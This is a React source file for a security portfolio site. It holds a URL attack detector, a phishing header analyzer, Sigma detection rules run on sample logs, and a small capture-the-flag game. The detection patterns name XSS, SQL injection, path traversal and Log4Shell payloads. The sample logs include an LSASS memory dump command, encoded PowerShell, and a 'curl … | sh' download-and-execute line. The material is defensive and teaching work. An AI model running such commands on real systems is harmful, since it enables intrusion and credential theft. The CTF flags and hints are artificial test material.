'use client';

/* Fourth batch: attack-aware site, phishing header analyzer, live Sigma rules, CTF. All client-side. */
import { useEffect, useMemo, useState } from 'react';
import { play } from './sound';

/* ================= Site that notices attacks in the URL ================= */
const payloads: { re: RegExp; kind: string; why: string }[] = [
  { re: /<\s*script|onerror\s*=|onload\s*=|javascript:|<\s*img[^>]+src|<\s*svg|alert\s*\(|document\.cookie/i, kind: 'Cross-site scripting (XSS)', why: 'React escapes everything it renders, and my Content Security Policy blocks inline scripts injected by anyone else. Your payload was shown as text, never run.' },
  { re: /('|%27)\s*(or|and)\s*('|%27)?\d|union(\s|\+|%20)+select|;\s*drop\s+table|sleep\s*\(\d|'\s*--/i, kind: 'SQL injection', why: 'There is no database behind this page, and in my real projects every query is parameterized, so input is always data, never SQL.' },
  { re: /\.\.\/|\.\.%2f|%2e%2e|\/etc\/passwd|win\.ini/i, kind: 'Path traversal', why: 'The site is static files served by Vercel. There is no file system path to walk out of.' },
  { re: /\$\{jndi:|\$\{\s*env|\{\{.*\}\}|<%=|#\{/i, kind: 'Template / Log4Shell injection', why: 'Nothing on this page evaluates templates or logs input with Log4j, so the expression stays inert text.' },
];
export function AttackAware() {
  const [hit, setHit] = useState<{ kind: string; why: string; sample: string } | null>(null);
  useEffect(() => {
    let raw = location.search + location.hash; try { raw = decodeURIComponent(raw); } catch { /* malformed encoding is fine */ }
    const p = payloads.find(x => x.re.test(raw));
    if (p) { setHit({ kind: p.kind, why: p.why, sample: raw.slice(0, 90) }); play('alarm'); }
  }, []);
  if (!hit) return null;
  return (
    <div className="aa" role="alertdialog" aria-label="Attack detected">
      <div className="aa-in">
        <small>siddharth@sec:~$ ids --alert</small>
        <h3>Nice try. 👀</h3>
        <p className="aa-k">Detected: <b>{hit.kind}</b> in the URL</p>
        <code>{hit.sample}</code>
        <p>{hit.why}</p>
        <p className="aa-hire">If you test things like this for fun, we&apos;d get along. Let&apos;s talk.</p>
        <div className="row"><a className="btn light" href="#contact" onClick={() => setHit(null)}>Contact me</a><button className="btn ghost" onClick={() => { setHit(null); history.replaceState(null, '', location.pathname); }}>Close</button></div>
      </div>
    </div>
  );
}

/* ================= Phishing header analyzer ================= */
const brands = ['paypal', 'microsoft', 'office365', 'outlook', 'google', 'gmail', 'apple', 'icloud', 'amazon', 'netflix', 'chase', 'wellsfargo', 'bankofamerica', 'docusign', 'dropbox', 'linkedin', 'fedex', 'dhl', 'usps', 'irs', 'coinbase'];
const urgent = /urgent|immediately|suspend|locked|verify|unusual|final notice|action required|password (will )?expire|confirm your|payment failed|invoice|wire transfer|gift card/i;
const lev = (a: string, b: string) => { const d = Array.from({ length: a.length + 1 }, (_, i) => [i, ...Array(b.length).fill(0)]); for (let j = 1; j <= b.length; j++) d[0][j] = j; for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++) d[i][j] = Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1)); return d[a.length][b.length]; };
const deglyph = (s: string) => s.replace(/rn/g, 'm').replace(/vv/g, 'w').replace(/0/g, 'o').replace(/1/g, 'l').replace(/3/g, 'e').replace(/5/g, 's');
const domainOf = (s?: string) => (s?.match(/@([a-z0-9.-]+\.[a-z]{2,})/i)?.[1] || s?.match(/([a-z0-9-]+\.)+[a-z]{2,}/i)?.[0] || '').toLowerCase();
const base = (d: string) => d.split('.').slice(-2).join('.');
const samplePhish = `Return-Path: <bounce@mailer-secure-update.ru>
Received: from mailer-secure-update.ru (unknown [185.234.xx.xx]) by mx.google.com
Authentication-Results: mx.google.com; spf=fail smtp.mailfrom=mailer-secure-update.ru; dkim=none; dmarc=fail header.from=paypa1.com
From: "PayPal Security" <service@paypa1.com>
Reply-To: support-team@protonmail-recovery.com
Subject: URGENT: Your account will be suspended - verify immediately
Date: Sun, 22 Nov 2026 09:14:02 +0000`;
type Finding = { sev: 'high' | 'med' | 'low' | 'ok'; t: string; d: string };
function analyzeHeaders(raw: string): { score: number; findings: Finding[]; from: string } {
  const unfolded = raw.replace(/\r?\n[ \t]+/g, ' ');
  const get = (h: string) => unfolded.match(new RegExp('^' + h + ':\\s*(.*)$', 'im'))?.[1]?.trim();
  const auth = (get('Authentication-Results') || '') + ' ' + (get('ARC-Authentication-Results') || '');
  const from = get('From') || '', fromD = domainOf(from), retD = domainOf(get('Return-Path')), repD = domainOf(get('Reply-To')), subj = get('Subject') || '';
  const display = from.match(/^"?([^"<]*)"?\s*</)?.[1]?.toLowerCase() || '';
  const f: Finding[] = []; let score = 0;
  const res = (k: string) => auth.match(new RegExp(k + '=(\\w+)', 'i'))?.[1]?.toLowerCase() || (k === 'spf' ? (get('Received-SPF')?.split(/\s/)[0] || '').toLowerCase() : '');
  for (const k of ['spf', 'dkim', 'dmarc']) {
    const v = res(k);
    if (!v) f.push({ sev: 'low', t: `${k.toUpperCase()}: not found`, d: 'No authentication result in these headers.' });
    else if (v === 'pass') f.push({ sev: 'ok', t: `${k.toUpperCase()}: pass`, d: k === 'dmarc' ? 'The From domain is aligned and authenticated.' : 'The sending server is authorized for that domain.' });
    else { score += k === 'dmarc' ? 30 : 20; f.push({ sev: 'high', t: `${k.toUpperCase()}: ${v}`, d: k === 'spf' ? 'The sending server is not allowed to send for this domain.' : k === 'dkim' ? 'No valid cryptographic signature: the message could be forged or altered.' : 'The From domain failed its own published policy. A strong sign of spoofing.' }); }
  }
  if (fromD && retD && base(fromD) !== base(retD)) { score += 15; f.push({ sev: 'med', t: 'Return-Path differs from From', d: `Bounces go to ${retD}, but it claims to be ${fromD}.` }); }
  if (fromD && repD && base(fromD) !== base(repD)) { score += 20; f.push({ sev: 'high', t: 'Reply-To goes somewhere else', d: `Your reply would go to ${repD}, not ${fromD}. Classic credential-harvest setup.` }); }
  if (/xn--/.test(fromD)) { score += 25; f.push({ sev: 'high', t: 'Punycode domain', d: `${fromD} uses look-alike Unicode characters.` }); }
  const label = fromD.split('.').slice(-2, -1)[0] || '';
  const look = brands.find(b => label !== b && (deglyph(label) === b || (lev(label, b) <= 2 && label.length >= 4) || (label.includes(b) && label !== b)));
  if (look) { score += 30; f.push({ sev: 'high', t: `Look-alike of ${look}`, d: `"${fromD}" imitates ${look} but isn't its real domain.` }); }
  const dispBrand = brands.find(b => display.includes(b));
  if (dispBrand && !label.includes(dispBrand)) { score += 15; f.push({ sev: 'med', t: 'Display name spoofing', d: `The name says "${display.trim()}", but the address is ${fromD}.` }); }
  if (urgent.test(subj)) { score += 10; f.push({ sev: 'med', t: 'Pressure language in subject', d: `"${subj.slice(0, 70)}". Urgency is used to stop you from thinking.` }); }
  return { score: Math.min(100, score), findings: f, from: fromD };
}
export function PhishAnalyzer() {
  const [raw, setRaw] = useState('');
  const [out, setOut] = useState<ReturnType<typeof analyzeHeaders> | null>(null);
  const [err, setErr] = useState('');
  const run = () => { if (!/^(from|received|return-path|authentication-results|subject):/im.test(raw)) { setErr('Paste raw email headers (they start with lines like "Received:" or "From:")'); return; } setErr(''); const r = analyzeHeaders(raw); setOut(r); play(r.score >= 50 ? 'alarm' : 'win'); };
  const v = out ? (out.score >= 50 ? ['Likely phishing', 'high'] : out.score >= 20 ? ['Suspicious', 'med'] : ['Looks legitimate', 'ok']) : null;
  return (
    <div className="lab-phish">
      <p className="lab-lead">Paste the <b>raw headers</b> of any email (in Gmail: ⋮ → Show original). I&apos;ll check it like a SOC analyst would. <b>It runs only in your browser.</b></p>
      <textarea className="ph-in" rows={7} value={raw} onChange={e => { setRaw(e.target.value); setErr(''); }} placeholder="Received: from …&#10;Authentication-Results: …&#10;From: …" spellCheck={false} aria-label="Email headers" />
      {err && <p className="lab-err">{err}</p>}
      <div className="ph-acts"><button className="btn light" onClick={run}>Analyze headers</button><button className="btn ghost" onClick={() => { setRaw(samplePhish); setOut(null); setErr(''); }}>Load a phishing sample</button></div>
      {out && v && (
        <div className="ph-out">
          <div className={'ph-verdict ' + v[1]}><b>{v[0]}</b><span>Risk score {out.score}/100{out.from && <> · sender {out.from}</>}</span><i style={{ width: `${out.score}%` }} /></div>
          <ul className="ph-list">{out.findings.map((x, i) => <li key={i} className={x.sev}><b>{x.t}</b><span>{x.d}</span></li>)}</ul>
        </div>
      )}
    </div>
  );
}

/* ================= Sigma rules, run live on sample logs ================= */
type Ev = Record<string, string | number>;
type Sel = Record<string, string | string[] | number>;
type Rule = { title: string; id: string; level: 'high' | 'critical' | 'medium'; tags: string[]; logsource: Record<string, string>; detection: Record<string, Sel> & { condition: string }; why: string };
const rules: Rule[] = [
  { title: 'Encoded PowerShell Command Line', id: 'sm-0001', level: 'high', tags: ['attack.execution', 'attack.t1059.001'], logsource: { category: 'process_creation', product: 'windows' }, detection: { selection: { 'Image|endswith': '\\powershell.exe', 'CommandLine|contains': [' -enc ', ' -EncodedCommand ', ' -e '] }, condition: 'selection' }, why: 'Attackers base64-encode PowerShell to hide what it does.' },
  { title: 'Office Application Spawning a Shell', id: 'sm-0002', level: 'high', tags: ['attack.execution', 'attack.t1204.002'], logsource: { category: 'process_creation', product: 'windows' }, detection: { selection: { 'ParentImage|endswith': ['\\WINWORD.EXE', '\\EXCEL.EXE', '\\OUTLOOK.EXE'], 'Image|endswith': ['\\cmd.exe', '\\powershell.exe', '\\wscript.exe'] }, condition: 'selection' }, why: 'Word or Excel launching a shell usually means a malicious macro.' },
  { title: 'LSASS Memory Dump', id: 'sm-0003', level: 'critical', tags: ['attack.credential_access', 'attack.t1003.001'], logsource: { category: 'process_creation', product: 'windows' }, detection: { selection: { 'CommandLine|contains': ['comsvcs.dll, MiniDump', 'procdump', 'lsass'] }, filter: { 'Image|endswith': '\\MsMpEng.exe' }, condition: 'selection and not filter' }, why: 'Dumping LSASS memory steals passwords and hashes.' },
  { title: 'Brute Force Followed by Success', id: 'sm-0004', level: 'high', tags: ['attack.credential_access', 'attack.t1110'], logsource: { product: 'windows', service: 'security' }, detection: { selection: { EventID: 4625 }, condition: 'selection | count() by IpAddress > 4' }, why: 'Many failed logons from one IP is password guessing.' },
  { title: 'Download Piped to Shell', id: 'sm-0005', level: 'high', tags: ['attack.command_and_control', 'attack.t1105'], logsource: { category: 'process_creation', product: 'linux' }, detection: { selection: { 'CommandLine|contains': ['curl ', 'wget '] }, pipe: { 'CommandLine|contains': ['| sh', '|sh', '| bash', '|bash'] }, condition: 'selection and pipe' }, why: 'Downloading and running a script in one step is how botnets install.' },
];
const logs: Ev[] = [
  { t: '09:01:12', host: 'FIN-WS-114', EventID: 1, Image: 'C:\\Program Files\\Microsoft Office\\WINWORD.EXE', ParentImage: 'C:\\Windows\\explorer.exe', CommandLine: 'WINWORD.EXE /n "Q4_invoice.docm"' },
  { t: '09:01:19', host: 'FIN-WS-114', EventID: 1, Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', ParentImage: 'C:\\Program Files\\Microsoft Office\\WINWORD.EXE', CommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi…' },
  { t: '09:02:03', host: 'IT-ADMIN-02', EventID: 1, Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', ParentImage: 'C:\\Windows\\explorer.exe', CommandLine: 'powershell.exe Get-Service | Export-Csv services.csv' },
  { t: '09:03:40', host: 'DC-01', EventID: 4625, IpAddress: '203.0.113.50', TargetUserName: 'admin-ops' },
  { t: '09:03:41', host: 'DC-01', EventID: 4625, IpAddress: '203.0.113.50', TargetUserName: 'admin-ops' },
  { t: '09:03:42', host: 'DC-01', EventID: 4625, IpAddress: '203.0.113.50', TargetUserName: 'admin-ops' },
  { t: '09:03:43', host: 'DC-01', EventID: 4625, IpAddress: '203.0.113.50', TargetUserName: 'admin-ops' },
  { t: '09:03:44', host: 'DC-01', EventID: 4625, IpAddress: '203.0.113.50', TargetUserName: 'admin-ops' },
  { t: '09:03:46', host: 'DC-01', EventID: 4624, IpAddress: '203.0.113.50', TargetUserName: 'admin-ops' },
  { t: '09:04:10', host: 'DC-01', EventID: 4625, IpAddress: '10.0.4.22', TargetUserName: 'jsmith' },
  { t: '09:05:55', host: 'FIN-WS-114', EventID: 1, Image: 'C:\\Windows\\System32\\rundll32.exe', ParentImage: 'C:\\Windows\\System32\\cmd.exe', CommandLine: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full' },
  { t: '09:06:02', host: 'AV', EventID: 1, Image: 'C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe', ParentImage: 'C:\\Windows\\System32\\services.exe', CommandLine: 'MsMpEng.exe scan lsass' },
  { t: '09:07:31', host: 'web-01', EventID: 1, Image: '/usr/bin/bash', ParentImage: '/usr/sbin/sshd', CommandLine: 'bash -c "curl -s http://198.51.100.9/x.sh | sh"' },
  { t: '09:08:00', host: 'web-01', EventID: 1, Image: '/usr/bin/curl', ParentImage: '/usr/bin/bash', CommandLine: 'curl -s https://api.github.com/repos' },
];
function matchSel(e: Ev, sel: Sel) {
  return Object.entries(sel).every(([k, v]) => {
    const [field, mod] = k.split('|'); const val = String(e[field] ?? '').toLowerCase(); if (e[field] === undefined) return false;
    const vals = (Array.isArray(v) ? v : [v]).map(x => String(x).toLowerCase());
    return vals.some(x => mod === 'endswith' ? val.endsWith(x) : mod === 'contains' ? val.includes(x) : mod === 'startswith' ? val.startsWith(x) : val === x);
  });
}
/* Tiny parser for Sigma conditions: names joined with and / or / not and parentheses (no eval) */
function evalCond(cond: string, val: (name: string) => boolean): boolean {
  const tk = cond.match(/\(|\)|\w+/g) || []; let i = 0;
  const atom = (): boolean => { const t = tk[i++]; if (t === 'not') return !atom(); if (t === '(') { const v = or(); i++; return v; } return val(t); };
  const and = (): boolean => { let v = atom(); while (tk[i] === 'and') { i++; const r = atom(); v = v && r; } return v; };
  const or = (): boolean => { let v = and(); while (tk[i] === 'or') { i++; const r = and(); v = v || r; } return v; };
  return or();
}
function runRule(r: Rule): Set<number> {
  const { condition, ...sels } = r.detection; const hits = new Set<number>();
  const agg = condition.match(/^(\w+)\s*\|\s*count\(\)\s*by\s*(\w+)\s*>\s*(\d+)$/);
  if (agg) {
    const [, s, by, n] = agg; const groups: Record<string, number[]> = {};
    logs.forEach((e, i) => { if (matchSel(e, sels[s] as Sel)) (groups[String(e[by])] ||= []).push(i); });
    Object.values(groups).forEach(g => { if (g.length > +n) g.forEach(i => hits.add(i)); });
    return hits;
  }
  logs.forEach((e, i) => { if (evalCond(condition, n => !!sels[n] && matchSel(e, sels[n] as Sel))) hits.add(i); });
  return hits;
}
function toYaml(r: Rule) {
  const q = (v: string | number) => (typeof v === 'number' ? String(v) : /[:'"\\|]/.test(v) ? `'${v.replace(/'/g, "''")}'` : v);
  const sel = (o: Sel) => Object.entries(o).map(([k, v]) => Array.isArray(v) ? `        ${k}:\n${v.map(x => `            - ${q(x)}`).join('\n')}` : `        ${k}: ${q(v)}`).join('\n');
  const { condition, ...sels } = r.detection;
  return `title: ${r.title}\nid: ${r.id}\nstatus: experimental\nauthor: Siddharth Muragundla\nlogsource:\n${Object.entries(r.logsource).map(([k, v]) => `    ${k}: ${v}`).join('\n')}\ndetection:\n${Object.entries(sels).map(([k, v]) => `    ${k}:\n${sel(v as Sel)}`).join('\n')}\n    condition: ${condition}\nlevel: ${r.level}\ntags:\n${r.tags.map(t => `    - ${t}`).join('\n')}`;
}
export function SigmaLab() {
  const [ri, setRi] = useState(0);
  const [hits, setHits] = useState<Set<number> | null>(null);
  const [scan, setScan] = useState(-1);
  const r = rules[ri];
  const yaml = useMemo(() => toYaml(r), [r]);
  const run = () => {
    const h = runRule(r); setHits(null); setScan(0);
    logs.forEach((_, i) => setTimeout(() => { setScan(i); if (h.has(i)) play('lock'); if (i === logs.length - 1) { setHits(h); setScan(-1); play(h.size ? 'alarm' : 'win'); } }, i * 110));
  };
  return (
    <div className="lab-sigma">
      <p className="lab-lead">Real <b>Sigma detection rules</b> I wrote, the standard format SOC teams share. Pick one and run it against sample Windows and Linux logs.</p>
      <div className="sg-tabs">{rules.map((x, i) => <button key={x.id} className={i === ri ? 'on' : ''} onClick={() => { setRi(i); setHits(null); setScan(-1); }}><span className={'lv ' + x.level}>{x.level}</span>{x.title}</button>)}</div>
      <div className="sg-grid">
        <div className="sg-rule"><pre>{yaml}</pre><p>{r.why}</p><button className="btn light" onClick={run} disabled={scan >= 0}>{scan >= 0 ? 'Scanning…' : 'Run rule'}</button>{hits && <span className={'sg-res' + (hits.size ? ' hit' : '')}>{hits.size ? `${hits.size} match${hits.size > 1 ? 'es' : ''} · alert raised` : 'No matches'}</span>}</div>
        <div className="sg-logs">{logs.map((e, i) => (
          <div key={i} className={'sg-l' + (scan === i ? ' scan' : '') + (hits?.has(i) ? ' hit' : '')}>
            <span className="t">{e.t}</span><span className="h">{e.host}</span><span className="m">{e.EventID === 4625 ? `4625 failed logon ${e.TargetUserName} from ${e.IpAddress}` : e.EventID === 4624 ? `4624 logon success ${e.TargetUserName} from ${e.IpAddress}` : String(e.CommandLine)}</span>
          </div>
        ))}</div>
      </div>
    </div>
  );
}

/* ================= CTF: 5 challenges, flags checked by SHA-256 (no plaintext flags in the code) ================= */
const ctf = [
  { k: 'web', name: 'Hidden in plain sight', pts: 100, cat: 'Web', hash: 'e908bf13700bf718df0545cea7ed174c0e5487b006f8dd1c018738a3b3728018', body: () => <p>This card is hiding something. Developers know where to look. <span className="ctf-hint">Hint: inspect this element.</span></p> },
  { k: 'crypto', name: 'Ancient secrets', pts: 100, cat: 'Crypto', hash: '05d9708232e391eac886363ec3c4d04a5ec1411c1e0048e458a623a955d5baf3', body: () => <><p>Intercepted message:</p><code className="ctf-code">synt{'{'}pnrfne_jnf_urer{'}'}</code><p className="ctf-hint">Hint: Julius would rotate it halfway around the alphabet.</p></> },
  { k: 'forensics', name: 'Captured credentials', pts: 200, cat: 'Forensics', hash: 'bc55f56d79b6bf0e4d7d7bd11e207421196eb235fcf221e035e68db796db910c', body: () => <><p>From a packet capture of an internal HTTP request:</p><code className="ctf-code">GET /admin HTTP/1.1{'\n'}Host: intranet.local{'\n'}Authorization: Basic YW5hbHlzdDpmbGFne2I0czFjXzFzX24wdF8zbmNyeXB0MTBufQ==</code><p className="ctf-hint">Hint: Basic auth is an encoding, not encryption.</p></> },
  { k: 'logs', name: 'Who got in?', pts: 200, cat: 'Logs', hash: 'd6df45b59e70902038d82ee4e0eedf08e36911182cc13b6554a2a65c36acf84e', body: () => <><p>Find the IP that brute-forced its way in. Flag format: <code>flag{'{'}IP{'}'}</code></p><code className="ctf-code">{`Nov 22 03:11:02 sshd: Failed password for root from 192.0.2.14
Nov 22 03:11:05 sshd: Failed password for root from 198.51.100.23
Nov 22 03:11:06 sshd: Failed password for root from 198.51.100.23
Nov 22 03:11:07 sshd: Failed password for admin from 198.51.100.23
Nov 22 03:11:09 sshd: Accepted password for admin from 198.51.100.23
Nov 22 03:12:40 sshd: Failed password for pi from 203.0.113.7
Nov 22 03:15:10 sshd: Accepted publickey for deploy from 10.0.0.5`}</code></> },
  { k: 'osint', name: 'Read the policy', pts: 150, cat: 'OSINT', hash: '3f32f5e79e5b33da07974ea1d155d569bc2a80d0f66e58cac724b52270018ff8', body: () => <p>This site publishes a security policy in a standard location. When does it expire? Flag format: <code>flag{'{'}YYYY-MM-DD{'}'}</code> <span className="ctf-hint">Hint: RFC 9116.</span></p> },
];
async function sha(s: string) { const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s.trim())); return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join(''); }
export function CtfBoard({ submit }: { submit: (name: string, score: number, solved: string[]) => Promise<boolean> }) {
  const [solved, setSolved] = useState<string[]>([]);
  const [input, setInput] = useState<Record<string, string>>({});
  const [msg, setMsg] = useState<Record<string, string>>({});
  const [name, setName] = useState('');
  const [sent, setSent] = useState<'idle' | 'ok' | 'fail'>('idle');
  useEffect(() => { try { setSolved(JSON.parse(localStorage.getItem('sm-ctf') || '[]')); } catch { /* storage unavailable */ } }, []);
  const check = async (k: string, hash: string) => {
    const v = (input[k] || '').trim(); if (!v) { setMsg(m => ({ ...m, [k]: 'Enter a flag first' })); return; }
    if ((await sha(v)) === hash) { const s = [...new Set([...solved, k])]; setSolved(s); try { localStorage.setItem('sm-ctf', JSON.stringify(s)); } catch { /* */ } setMsg(m => ({ ...m, [k]: '✓ Correct!' })); play('win'); }
    else { setMsg(m => ({ ...m, [k]: '✕ Not quite. Flags look like flag{…}' })); play('fail'); }
  };
  const score = ctf.filter(c => solved.includes(c.k)).reduce((n, c) => n + c.pts, 0), max = ctf.reduce((n, c) => n + c.pts, 0);
  return (
    <div className="ctf">
      <div className="ctf-head"><div><small className="pc-k">Capture the flag</small><h3>Can you beat my CTF?</h3><p>Five challenges across web, crypto, forensics, logs and OSINT. Flags look like <code>flag{'{'}…{'}'}</code>.</p></div><div className="ctf-score"><b>{score}</b><span>/ {max} pts</span><i><em style={{ width: `${(score / max) * 100}%` }} /></i></div></div>
      <div className="ctf-grid">{ctf.map(c => (
        <article key={c.k} className={'ctf-c' + (solved.includes(c.k) ? ' done' : '')} data-x={c.k === 'web' ? 'ZmxhZ3t2MTN3X3MwdXJjM193MW5zfQ==' : undefined}>
          <header><span className="cat">{c.cat}</span><span className="pts">{c.pts} pts</span></header>
          <h4>{solved.includes(c.k) && '✓ '}{c.name}</h4>
          {c.body()}
          <div className="ctf-in"><input value={input[c.k] || ''} onChange={e => { setInput(i => ({ ...i, [c.k]: e.target.value })); setMsg(m => ({ ...m, [c.k]: '' })); }} placeholder="flag{...}" spellCheck={false} aria-label={`Flag for ${c.name}`} /><button className="btn ghost" onClick={() => check(c.k, c.hash)}>Submit</button></div>
          {msg[c.k] && <small className={msg[c.k].startsWith('✓') ? 'ok' : 'no'}>{msg[c.k]}</small>}
        </article>
      ))}</div>
      <div className="ctf-board">
        <div><b>Leaderboard</b><span>Submit your score and I&apos;ll add you to the public board. Your progress is saved in this browser.</span></div>
        <div className="ctf-sub"><input value={name} onChange={e => setName(e.target.value)} placeholder="Your name or handle" maxLength={40} aria-label="Name for the leaderboard" /><button className="btn light" disabled={!score || !name.trim() || sent === 'ok'} onClick={async () => { const ok = await submit(name.trim(), score, solved); setSent(ok ? 'ok' : 'fail'); }}>{sent === 'ok' ? 'Submitted ✓' : 'Submit score'}</button></div>
        {sent === 'fail' && <small className="no">Couldn&apos;t submit right now. Try again later.</small>}
      </div>
    </div>
  );
}
